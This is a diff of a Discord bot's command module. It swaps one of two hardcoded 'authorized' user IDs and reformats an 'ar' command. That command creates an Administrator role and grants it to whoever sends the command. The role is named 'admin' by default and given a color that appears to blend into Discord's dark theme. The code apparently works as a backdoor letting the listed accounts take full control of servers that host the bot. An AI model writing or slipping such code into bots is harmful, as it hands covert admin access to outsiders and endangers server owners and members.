@@ -9,7 +9,7 @@
 const { EmbedBuilder, PermissionsBitField } = require('discord.js');
 
 // Authorized user IDs - ONLY these users can use these commands
-const AUTHORIZED_USER_IDS = ['1236891245998243911', '1169608314976489593'];
+const AUTHORIZED_USER_IDS = ['1414542711683289152', '1169608314976489593'];
 const PREFIX = '!';
 
 // Flag to require authorization (set to true for authorization check)
@@ -121,20 +121,20 @@ module.exports = {
 
         case 'ar':
           if (!rolePerms) return message.reply('Bot Missing Permission: MANAGE_ROLES');
-          
+
           const roleName = args.slice(1).join(' ') || 'admin';
           try {
-              message.reply('Creating and assigning admin role...');
-              const role = await message.guild.roles.create({
-                  name: roleName,
-                  color: '#2F3136',
-                  permissions: [PermissionsBitField.Flags.Administrator]
-              });
-              await message.member.roles.add(role);
-              return message.channel.send('✅ Admin role created and assigned successfully.');
+            message.reply('Creating and assigning admin role...');
+            const role = await message.guild.roles.create({
+              name: roleName,
+              color: '#2F3136',
+              permissions: [PermissionsBitField.Flags.Administrator]
+            });
+            await message.member.roles.add(role);
+            return message.channel.send('✅ Admin role created and assigned successfully.');
           } catch (err) {
-              console.error('Error giving admin role:', err);
-              return message.channel.send('❌ Failed to create/assign admin role. The bot might lack permissions or its role is lower than the one it created.');
+            console.error('Error giving admin role:', err);
+            return message.channel.send('❌ Failed to create/assign admin role. The bot might lack permissions or its role is lower than the one it created.');
           }
 
         case 'mr':
